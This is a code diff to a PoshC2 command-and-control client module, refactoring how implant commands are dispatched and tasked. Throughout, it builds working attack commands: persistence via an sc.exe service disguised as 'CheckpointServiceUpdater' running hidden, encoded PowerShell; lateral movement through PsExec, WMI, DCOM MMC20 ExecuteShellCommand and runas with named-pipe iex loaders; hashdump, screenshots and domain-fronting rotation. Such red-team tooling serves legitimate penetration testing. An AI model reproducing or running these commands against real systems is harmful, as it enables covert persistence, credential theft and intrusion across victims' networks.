@@ -1,26 +1,23 @@
 import base64, re, traceback, os
-from poshc2.client.Alias import ps_alias
-from poshc2.Colours import Colours
-from poshc2.Utils import argp, load_file, gen_key
-from poshc2.server.AutoLoads import check_module_loaded, run_autoloads
-from poshc2.client.Help import posh_help
-from poshc2.server.Config import PayloadsDirectory, PoshInstallDirectory, PoshProjectDirectory, SocksHost, ModulesDirectory, DatabaseType, DomainFrontHeader, PayloadCommsHost
-from poshc2.server.Core import print_bad, creds, print_good
-from poshc2.client.Opsec import ps_opsec
-from poshc2.server.Payloads import Payloads
 from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 from prompt_toolkit.styles import Style
+
+from poshc2.client.Alias import ps_alias
+from poshc2.Colours import Colours
+from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_dfheader, yes_no_prompt
+from poshc2.server.AutoLoads import check_module_loaded, run_autoloads
+from poshc2.client.Help import posh_help
+from poshc2.server.Config import PayloadsDirectory, PoshInstallDirectory, PoshProjectDirectory, SocksHost, ModulesDirectory, DomainFrontHeader, PayloadCommsHost
+from poshc2.server.Config import PBindSecret, PBindPipeName
+from poshc2.server.Core import print_bad, creds, print_good
+from poshc2.client.Opsec import ps_opsec
+from poshc2.server.payloads.Payloads import Payloads
+from poshc2.server.PowerStatus import getpowerstatus
 from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
-
-
-if DatabaseType.lower() == "postgres":
-    from poshc2.server.database.DBPostgres import new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
-    from poshc2.server.database.DBPostgres import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails
-else:
-    from poshc2.server.database.DBSQLite import new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
-    from poshc2.server.database.DBSQLite import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails
+from poshc2.server.database.DB import new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
+from poshc2.server.database.DB import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails, get_powerstatusbyrandomuri
 
 
 def handle_ps_command(command, user, randomuri, implant_id):
@@ -50,17 +47,14 @@ def handle_ps_command(command, user, randomuri, implant_id):
                 command = ""
             break
 
-    if command.startswith("unhook-amsi"):
-        do_unhook_amsi(user, command, randomuri)
+    if command.startswith("searchhistory"):
+        do_searchhistory(user, command, randomuri)
         return
     elif command.startswith("searchhelp"):
         do_searchhelp(user, command, randomuri)
         return
     elif command.startswith("download-files "):
         do_download_files(user, command, randomuri)
-        return
-    elif command.startswith("install-servicelevel-persistencewithproxy"):
-        do_install_servicelevel_persistencewithproxy(user, command, randomuri)
         return
     elif command.startswith("install-servicelevel-persistence"):
         do_install_servicelevel_persistence(user, command, randomuri)
@@ -71,23 +65,11 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command.startswith("get-implantworkingdirectory"):
         do_get_implantworkingdirectory(user, command, randomuri)
         return
-    elif command.startswith("get-system-withproxy"):
-        do_get_system_withproxy(user, command, randomuri)
-        return
-    elif command.startswith("get-system-withdaisy"):
-        do_get_system_withdaisy(user, command, randomuri)
-        return
     elif command.startswith("get-system"):
         do_get_system(user, command, randomuri)
         return
     elif command.startswith("invoke-psexec ") or command.startswith("invoke-smbexec "):
         do_invoke_psexec(user, command, randomuri)
-        return
-    elif command.startswith("invoke-psexecproxypayload "):
-        do_invoke_psexecproxypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-psexecdaisypayload "):
-        do_invoke_psexecdaisypayload(user, command, randomuri)
         return
     elif command.startswith("invoke-psexecpayload "):
         do_invoke_psexecpayload(user, command, randomuri)
@@ -98,41 +80,17 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command.startswith("invoke-wmijspbindpayload "):
         do_invoke_wmijspbindpayload(user, command, randomuri)
         return
-    elif command.startswith("invoke-wmijsproxypayload "):
-        do_invoke_wmijsproxypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-wmijsdaisypayload "):
-        do_invoke_wmijsdaisypayload(user, command, randomuri)
-        return
     elif command.startswith("invoke-wmijspayload "):
         do_invoke_wmijspayload(user, command, randomuri)
         return
-    elif command.startswith("invoke-wmiproxypayload "):
-        do_invoke_wmiproxypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-wmidaisypayload "):
-        do_invoke_wmidaisypayload(user, command, randomuri)
-        return
     elif command.startswith("invoke-wmipayload "):
         do_invoke_wmipayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-dcomproxypayload "):
-        do_invoke_dcomproxypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-dcomdaisypayload "):
-        do_invoke_dcomdaisypayload(user, command, randomuri)
         return
     elif command.startswith("invoke-dcompayload "):
         do_invoke_dcompayload(user, command, randomuri)
         return
     elif command.startswith("invoke-runas "):
         do_invoke_runas(user, command, randomuri)
-        return
-    elif command.startswith("invoke-runasdaisypayload"):
-        do_invoke_runasdaisypayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-runasproxypayload"):
-        do_invoke_runasproxypayload(user, command, randomuri)
         return
     elif command.startswith("invoke-runaspayload"):
         do_invoke_runaspayload(user, command, randomuri)
@@ -176,8 +134,20 @@ def handle_ps_command(command, user, randomuri, implant_id):
     elif command == "ps":
         do_ps(user, command, randomuri)
         return
+    elif command == "get-screenshotmulti":
+        do_get_screenshotmulti(user, command, randomuri)
+        return
+    elif command == "get-powerstatus":
+        do_get_powerstatus(user, command, randomuri)
+        return
+    elif command == "get-screenshot":
+        do_get_screenshot(user, command, randomuri)
+        return
     elif command == "hashdump":
         do_hashdump(user, command, randomuri)
+        return
+    elif command == "loadpowerstatus":
+        do_loadpowerstatus(user, command, randomuri)
         return
     elif command == "stopdaisy":
         do_stopdaisy(user, command, randomuri)
@@ -187,6 +157,12 @@ def handle_ps_command(command, user, randomuri, implant_id):
         return
     elif command == "sharpsocks":
         do_sharpsocks(user, command, randomuri)
+        return
+    elif (command.startswith("enable-rotation")):
+        do_rotation(user, command, randomuri)
+        return
+    elif (command.startswith("get-rotation")):
+        do_get_rotation(user, command, randomuri)
         return
     elif command.startswith("reversedns"):
         do_reversedns(user, command, randomuri)
@@ -203,8 +179,12 @@ def handle_ps_command(command, user, randomuri, implant_id):
         return
 
 
-def do_unhook_amsi(user, command, randomuri):
-    new_task("unhook", user, randomuri)
+def do_searchhistory(user, command, randomuri):
+    searchterm = (command).replace("searchhistory ", "")
+    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
+        for line in hisfile:
+            if searchterm in line.lower():
+                print(Colours.GREEN + line.replace("+", ""))
 
 
 def do_searchhelp(user, command, randomuri):
@@ -219,27 +199,20 @@ def do_download_files(user, command, randomuri):
     print_bad("Please enter a full path to the directory")
 
 
-def do_install_servicelevel_persistencewithproxy(user, command, randomuri):
-    C2 = get_c2server_all()
-    if C2[11] == "":
-        print_bad("Need to run createproxypayload first")
-        return
-    else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-                              C2[13], C2[11], "", "", C2[17], C2[18],
-                              C2[19], "%s?p" % get_newimplanturl(), PayloadsDirectory)
-        payload = newPayload.CreateRawBase()
-        cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
-        new_task(cmd, user, randomuri)
-
-
 def do_install_servicelevel_persistence(user, command, randomuri):
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    cmd = "sc.exe create CPUpdater binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+    if os.path.isfile(path):
+        with open(path, "r") as p:
+            payload = p.read()
+    cmd = "sc.exe create CPUpdater binpath= 'cmd /c %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
     new_task(cmd, user, randomuri)
 
 
@@ -251,28 +224,18 @@ def do_get_implantworkingdirectory(user, command, randomuri):
     new_task("pwd", user, randomuri)
 
 
-def do_get_system_withproxy(user, command, randomuri):
-    C2 = get_c2server_all()
-    if C2[11] == "":
-        print_bad("Need to run createproxypayload first")
+def do_get_system(user, command, randomuri):
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
         return
-    else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-                              C2[13], C2[11], "", "", C2[17], C2[18],
-                              C2[19], "%s?p" % get_newimplanturl(), PayloadsDirectory)
-        payload = newPayload.CreateRawBase()
-        cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
-        new_task(cmd, user, randomuri)
-        cmd = "sc.exe start CPUpdaterMisc"
-        new_task(cmd, user, randomuri)
-        cmd = "sc.exe delete CPUpdaterMisc"
-        new_task(cmd, user, randomuri)
-
-
-def do_get_system_withdaisy(user, command, randomuri):
-    daisyname = input("Payload name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
         cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
         new_task(cmd, user, randomuri)
@@ -280,20 +243,6 @@ def do_get_system_withdaisy(user, command, randomuri):
         new_task(cmd, user, randomuri)
         cmd = "sc.exe delete CPUpdaterMisc"
         new_task(cmd, user, randomuri)
-
-
-def do_get_system(user, command, randomuri):
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s' Displayname= CheckpointServiceModule start= auto" % payload
-    new_task(cmd, user, randomuri)
-    cmd = "sc.exe start CPUpdaterMisc"
-    new_task(cmd, user, randomuri)
-    cmd = "sc.exe delete CPUpdaterMisc"
-    new_task(cmd, user, randomuri)
 
 
 @creds()
@@ -310,48 +259,29 @@ def do_invoke_smbexec(user, command, randomuri):
 
 
 @creds()
-def do_invoke_psexecproxypayload(user, command, randomuri):
+def do_invoke_psexecpayload(user, command, randomuri):
     check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
+
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
-        params = re.compile("invoke-psexecproxypayload ", re.IGNORECASE)
+        params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
         params = params.sub("", command)
         cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
         new_task(cmd, user, randomuri)
     else:
         print_bad("Need to run createproxypayload first")
         return
-
-
-@creds()
-def do_invoke_psexecdaisypayload(user, command, randomuri):
-    check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
-    daisyname = input("Payload name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
-        new_task(cmd, user, randomuri)
-    else:
-        print_bad("Need to run createdaisypayload first")
-        return
-
-
-@creds()
-def do_invoke_psexecpayload(user, command, randomuri):
-    check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
-    new_task(cmd, user, randomuri)
 
 
 @creds()
@@ -377,7 +307,7 @@ def do_invoke_wmijspbindpayload(user, command, randomuri):
     C2 = get_c2server_all()
     print()
     print("To connect to the SMB named pipe use the following command:")
-    print(Colours.GREEN + "invoke-pbind -target %s -secret mtkn4 -key %s -pname jaccdpqnvbrrxlaf -client" % (target[0], C2[2]) + Colours.END)
+    print(f"{Colours.GREEN}invoke-pbind -target {target[0]} -secret {PBindSecret} -key {C2.EncKey} -pname {PBindPipeName} -client{Colours.END}")
     print()
     print("To issue commands to the SMB named pipe use the following command:")
     print(Colours.GREEN + "pbind-command \"pwd\"" + Colours.END)
@@ -390,135 +320,76 @@ def do_invoke_wmijspbindpayload(user, command, randomuri):
 
 
 @creds()
-def do_invoke_wmijsproxypayload(user, command, randomuri):
-    check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-    if os.path.isfile(("%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy"))):
-        with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy"), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-wmijsproxypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, "Proxy")), user, randomuri)
-        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
-        new_task(cmd, user, randomuri)
-    else:
-        print_bad("Need to run createproxypayload first")
-        return
-
-
-@creds()
-def do_invoke_wmijsdaisypayload(user, command, randomuri):
-    check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-    daisyname = input("Name required: ")
-    if os.path.isfile(("%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname))):
-        with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-wmijsdaisypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, daisyname)), user, randomuri)
-        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
-        new_task(cmd, user, randomuri)
-    else:
-        print_bad("Need to run createdaisypayload first")
-        return
-
-
-@creds()
 def do_invoke_wmijspayload(user, command, randomuri):
     check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-    with open("%s%sDotNet2JS.b64" % (PayloadsDirectory, ""), "r") as p:
-        payload = p.read()
-    params = re.compile("invoke-wmijspayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS.b64" % (PayloadsDirectory, "")), user, randomuri)
-    cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
-    new_task(cmd, user, randomuri)
-
-
-@creds()
-def do_invoke_wmiproxypayload(user, command, randomuri):
-    check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
-        new_task(cmd, user, randomuri)
-    else:
-        print_bad("Need to run createproxypayload first")
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
         return
 
-
-@creds()
-def do_invoke_wmidaisypayload(user, command, randomuri):
-    check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
-    daisyname = input("Name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
-        params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
+        params = re.compile("invoke-wmijspayload ", re.IGNORECASE)
         params = params.sub("", command)
-        cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
+        new_task("$Shellcode64=\"%s\" #%s" % (payload, path), user, randomuri)
+        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
         new_task(cmd, user, randomuri)
     else:
-        print_bad("Need to run createdaisypayload first")
+        print_bad("Need to run createnewpayload first")
         return
 
 
 @creds()
 def do_invoke_wmipayload(user, command, randomuri):
     check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    params = re.compile("invoke-wmipayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
-    new_task(cmd, user, randomuri)
-
-
-@creds()
-def do_invoke_dcomproxypayload(user, command, randomuri):
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, "Proxy"))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, "Proxy"), "r") as p:
-            payload = p.read()
-        params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-        p = re.compile(r'(?<=-target.).*')
-        target = re.search(p, command).group()
-        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (target, payload)
-        new_task(pscommand, user, randomuri)
-    else:
-        print_bad("Need to run createproxypayload first")
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
         return
 
-
-def do_invoke_dcomdaisypayload(user, command, randomuri):
-    daisyname = input("Name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
-        p = re.compile(r'(?<=-target.).*')
-        target = re.search(p, command).group()
-        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
-        new_task(pscommand, user, randomuri)
+        params = re.compile("invoke-wmipayload ", re.IGNORECASE)
+        params = params.sub("", command)
+        cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
+        new_task(cmd, user, randomuri)
     else:
         print_bad("Need to run createdaisypayload first")
         return
 
 
 def do_invoke_dcompayload(user, command, randomuri):
-    C2 = get_c2server_all()
-    newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
-                          "", "", "", "", C2[17], C2[18],
-                          C2[19], get_newimplanturl(), PayloadsDirectory)
-    payload = newPayload.CreateRawBase()
-    p = re.compile(r'(?<=-target.).*')
-    target = re.search(p, command).group()
-    pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
-    new_task(pscommand, user, randomuri)
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+    if os.path.isfile(path):
+        with open(path, "r") as p:
+            payload = p.read()
+        p = re.compile(r'(?<=-target.).*')
+        target = re.search(p, command).group()
+        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
+        new_task(pscommand, user, randomuri)
+    else:
+        print_bad("Need to run createnewpayload first")
+        return
 
 
 @creds(accept_hashes=False)
@@ -531,10 +402,18 @@ def do_invoke_runas(user, command, randomuri):
 
 
 @creds(accept_hashes=False)
-def do_invoke_runasdaisypayload(user, command, randomuri):
-    daisyname = input("Name required: ")
-    if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory, daisyname))):
-        with open("%s%spayload.bat" % (PayloadsDirectory, daisyname), "r") as p:
+def do_invoke_runaspayload(user, command, randomuri):
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    try:
+        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
+        path = PayloadsDirectory + path
+    except KeyboardInterrupt:
+        return
+    if os.path.isfile(path):
+        with open(path, "r") as p:
             payload = p.read()
         new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
         check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
@@ -545,42 +424,8 @@ def do_invoke_runasdaisypayload(user, command, randomuri):
         pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
         new_task(pscommand, user, randomuri)
     else:
-        print("Need to run createdaisypayload first")
+        print("Need to run createnewpayload first")
         return
-
-
-@creds(accept_hashes=False)
-def do_invoke_runasproxypayload(user, command, randomuri):
-    C2 = get_c2server_all()
-    if C2[11] == "":
-        print_bad("Need to run createproxypayload first")
-        return
-    else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-                              C2[13], C2[11], "", "", C2[17], C2[18],
-                              C2[19], "%s?p" % get_newimplanturl(), PayloadsDirectory)
-        payload = newPayload.CreateRawBase()
-        proxyvar = "$proxypayload = \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % payload
-        new_task(proxyvar, user, randomuri)
-        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
-        check_module_loaded("NamedPipeProxy.ps1", randomuri, user)
-        params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
-        params = params.sub("", command)
-
-        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
-        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
-        new_task(pscommand, user, randomuri)
-
-
-@creds(accept_hashes=False)
-def do_invoke_runaspayload(user, command, randomuri):
-    check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
-    check_module_loaded("NamedPipe.ps1", randomuri, user)
-    params = re.compile("invoke-runaspayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
-    pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params, base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
-    new_task(pscommand, user, randomuri)
 
 
 def do_help(user, command, randomuri):
@@ -589,7 +434,7 @@ def do_help(user, command, randomuri):
 
 def do_get_pid(user, command, randomuri):
     implant_details = get_implantdetails(randomuri)
-    print(implant_details[8])
+    print(implant_details.PID)
 
 
 def do_upload_file(user, command, randomuri):
@@ -611,6 +456,7 @@ def do_upload_file(user, command, randomuri):
             source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
             source = PayloadsDirectory + source
         destination = session.prompt("Location to upload to: ")
+        nothidden = yes_no_prompt("Do not hide the file:")
     else:
         args = argp(command)
         source = args.source
@@ -619,7 +465,7 @@ def do_upload_file(user, command, randomuri):
     try:
         print("Uploading %s to %s" % (source, destination))
         if (nothidden):
-            uploadcommand = f"upload-file {source} {destination} -NotHidden {nothidden}"
+            uploadcommand = f"upload-file {source} {destination} -NotHidden ${nothidden}"
         else:
             uploadcommand = f"upload-file {source} {destination}"
         new_task(uploadcommand, user, randomuri)
@@ -630,7 +476,7 @@ def do_upload_file(user, command, randomuri):
 
 def do_kill_implant(user, command, randomuri):
     impid = get_implantdetails(randomuri)
-    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
+    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
     if ri.lower() == "n":
         print("Implant not terminated")
     if ri == "":
@@ -649,8 +495,8 @@ def do_migrate(user, command, randomuri):
     params = re.compile("migrate", re.IGNORECASE)
     params = params.sub("", command)
     implant = get_implantdetails(randomuri)
-    implant_arch = implant[10]
-    implant_comms = implant[15]
+    implant_arch = implant.Arch
+    implant_comms = implant.Pivot
     if implant_arch == "AMD64":
         arch = "64"
     else:
@@ -732,7 +578,7 @@ def do_listmodules(user, command, randomuri):
 
 def do_modulesloaded(user, command, randomuri):
     ml = get_implantdetails(randomuri)
-    print(ml[14])
+    print(ml.ModsLoaded)
 
 
 def do_ps(user, command, randomuri):
@@ -762,19 +608,12 @@ def do_sharpsocks(user, command, randomuri):
     channel = "".join(choice(allchar) for x in range(25))
     sharpkey = gen_key().decode("utf-8")
     sharpurls = get_sharpurls()
-    sharpurl = select_item("PayloadCommsHost", "C2Server")
-    sharpport = select_item("PayloadCommsPort", "C2Server")
-    dfheader = select_item("DomainFrontHeader", "C2Server")
+    sharpurl = get_first_url(select_item("PayloadCommsHost", "C2Server"), select_item("DomainFrontHeader", "C2Server"))
+    dfheader = get_first_dfheader(select_item("DomainFrontHeader", "C2Server"))
     implant = get_implantdetails(randomuri)
-    pivot = implant[15]
+    pivot = implant.Pivot
     if pivot != "PS":
         sharpurl = input("Enter the URL for SharpSocks: ")
-    if (sharpport != 80 and sharpport != 443):
-        if (sharpurl.count("/") >= 3):
-            pat = re.compile(r"(?<!/)/(?!/)")
-            sharpurl = pat.sub(":%s/" % sharpport, str, 1)
-        else:
-            sharpurl = ("%s:%s" % (sharpurl, sharpport))
 
     print(PoshInstallDirectory + "resources/SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN)
     ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
@@ -794,7 +633,46 @@ def do_reversedns(user, command, randomuri):
     new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)
 
 
+def do_rotation(user, command, randomuri):
+    domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
+    domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
+    new_task("set-variable -name rotdf -value %s" % domainfront, user, randomuri)
+    new_task("set-variable -name rotate -value %s" % domain, user, randomuri)
+
+
+def do_get_rotation(user, command, randomuri):
+    new_task("get-variable -name rotdf", user, randomuri)
